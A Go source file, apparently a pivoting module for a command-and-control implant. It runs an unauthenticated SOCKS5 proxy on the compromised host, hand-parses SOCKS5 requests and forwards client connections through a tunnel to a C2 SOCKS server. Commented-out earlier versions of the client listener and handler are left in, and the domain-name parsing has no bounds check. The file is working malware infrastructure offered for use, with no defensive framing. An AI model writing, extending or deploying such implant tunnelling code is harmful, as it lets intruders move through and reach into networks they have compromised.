package pivots

import (
    "fmt"
    "log"
    "net"
    "io" 
    "github.com/armon/go-socks5"  
)

var socksListener net.Listener 

// Helper function to parse the client's SOCKS request and extract target
func extractTarget(buf []byte) string {
    if buf[0] != 0x05 {  // Not SOCKS5
        log.Println("Invalid SOCKS5 version")
        return ""
    }
    if buf[1] != 0x01 {  // Only handle "Connect" command
        log.Println("Only 'Connect' command (0x01) is supported")
        return ""
    }

    addressType := buf[3]
    var targetAddr string
    var addrLen int

    switch addressType {
    case 0x01: // IPv4 address
        if len(buf) < 10 {
            log.Println("Invalid SOCKS5 IPv4 request length")
            return ""
        }
        targetAddr = fmt.Sprintf("%d.%d.%d.%d", buf[4], buf[5], buf[6], buf[7])
        addrLen = 4
    case 0x03: // Domain name
        addrLen = int(buf[4])  // Address length is specified in byte 4
        targetAddr = string(buf[5 : 5+addrLen])
    case 0x04: // IPv6 address
        if len(buf) < 22 {
            log.Println("Invalid SOCKS5 IPv6 request length")
            return ""
        }
        targetAddr = fmt.Sprintf("%x:%x:%x:%x:%x:%x:%x:%x", buf[4:6], buf[6:8], buf[8:10], buf[10:12], buf[12:14], buf[14:16], buf[16:18], buf[18:20])
        addrLen = 16
    default:
        log.Println("Unsupported address type")
        return ""
    }

    targetPort := fmt.Sprintf("%d", (int(buf[4+addrLen])<<8)+int(buf[5+addrLen]))

    return fmt.Sprintf("%s:%s", targetAddr, targetPort)
}

// Start SOCKS client listener
/*
func StartSocksClient(localAddr string, c2SocksAddr string) {
    var err error
    socksListener, err = net.Listen("tcp", localAddr)
    if err != nil {
        log.Fatal("Failed to start SOCKS client listener:", err)
	return
    }
    defer socksListener.Close()

    log.Println("Implant SOCKS5 Client listening on", localAddr)

    for {
        clientConn, err := socksListener.Accept()
        if err != nil {
            log.Println("Failed to accept connection:", err)
            continue
        }
        go handleClient(clientConn, c2SocksAddr)
    }
}
*/
func StartSocksServer(localAddr string) {
    conf := &socks5.Config{} // No authentication
    server, err := socks5.New(conf)
    if err != nil {
        log.Fatal("Failed to create SOCKS5 server:", err)
    }

    listener, err := net.Listen("tcp", localAddr)
    if err != nil {
        log.Fatal("Failed to start SOCKS server:", err)
    }
    defer listener.Close()

    log.Printf("Implant SOCKS5 server listening on %s", localAddr)
    server.Serve(listener)
}


// Stop the SOCKS client listener
func StopSocksClient() error {
    if socksListener != nil {
        err := socksListener.Close() // Close the listener
        if err != nil {
            log.Println("Failed to stop SOCKS client:", err)
            return err
        }
        log.Println("SOCKS client listener stopped successfully.")
    } else {
        log.Println("SOCKS client listener is not running.")
    }
    return nil
}

// handleClient function to handle incoming client connections
/*
func handleClient(clientConn net.Conn, c2SocksAddr string) {
    defer clientConn.Close()

    // You can add the logic to handle the client connection here, such as forwarding the connection to the C2 SOCKS server
    fmt.Println("Handling new client connection:", clientConn.RemoteAddr())

    // Example logic to forward data between the client and the C2 server
    c2Conn, err := net.Dial("tcp", c2SocksAddr)
    if err != nil {
        log.Println("Failed to connect to C2 server:", err)
        return
    }
    defer c2Conn.Close()

    // Use goroutines to handle bidirectional data forwarding between client and C2 server
    go io.Copy(c2Conn, clientConn)
    go io.Copy(clientConn, c2Conn)
}
*/
func handleClient(clientConn net.Conn, c2SocksAddr string) {
    defer clientConn.Close()

    // SOCKS5 Handshake
    buf := make([]byte, 256)
    n, err := clientConn.Read(buf)
    if err != nil || n < 3 {
        log.Println("Failed to read handshake:", err)
        return
    }

    // Respond to handshake: No authentication required
    clientConn.Write([]byte{0x05, 0x00})

    // Read client request
    n, err = clientConn.Read(buf)
    if err != nil {
        log.Println("Failed to read request:", err)
        return
    }

    // Parse target address from request
    target := extractTarget(buf[:n])
    if target == "" {
        clientConn.Write([]byte{0x05, 0x01, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00})
        return
    }

    // Connect to C2 SOCKS server
    c2Conn, err := net.Dial("tcp", c2SocksAddr)
    if err != nil {
        log.Println("Failed to connect to C2:", err)
        clientConn.Write([]byte{0x05, 0x03, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00})
        return
    }
    defer c2Conn.Close()

    // Send success response to client
    clientConn.Write([]byte{0x05, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00})

    // Bidirectional data forwarding
    go io.Copy(c2Conn, clientConn)
    io.Copy(clientConn, c2Conn)
}
